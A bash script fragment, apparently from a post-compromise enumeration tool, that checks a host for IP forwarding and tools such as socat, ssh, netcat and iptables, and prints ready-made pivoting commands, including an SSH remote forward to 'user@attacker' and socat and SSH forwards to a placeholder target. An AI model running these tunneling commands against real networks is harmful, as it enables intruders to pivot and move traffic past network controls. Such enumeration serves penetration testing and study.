#!/bin/bash
# -----------------------------------------------------------------------------
# Evaluates host capabilities and techniques for network pivoting and traffic
# tunneling.
# -----------------------------------------------------------------------------

(
    if [ -r "/proc/sys/net/ipv4/ip_forward" ]; then
        printf 'IPv4 Forwarding: %s\n\n' "$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)"
    fi

    if _have socat; then
        printf '[+] socat: %s\n' "$(command -v socat 2>/dev/null)"
        printf '    socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80 &\n'
    fi

    if _have ssh; then
        printf '[+] ssh: %s\n' "$(command -v ssh 2>/dev/null)"
        printf '    Local:   ssh -N -L 0.0.0.0:8080:TARGET_IP:80 user@pivot\n'
        printf '    Remote:  ssh -N -R 8080:TARGET_IP:80 user@attacker\n'
        printf '    Dynamic: ssh -N -D 1080 user@pivot\n'
    fi

    if _have ncat || _have nc; then
        printf '[+] netcat: %s\n' "$(command -v ncat 2>/dev/null || command -v nc 2>/dev/null)"
    fi

    if _have python3; then
        printf '[+] python3: %s\n' "$(command -v python3 2>/dev/null)"
    fi

    if _have iptables || _have nft; then
        printf '[+] Packet Filtering: %s\n' "$(command -v iptables 2>/dev/null || command -v nft 2>/dev/null)"
    fi
) | label "Network Pivoting & Tunneling Capabilities"
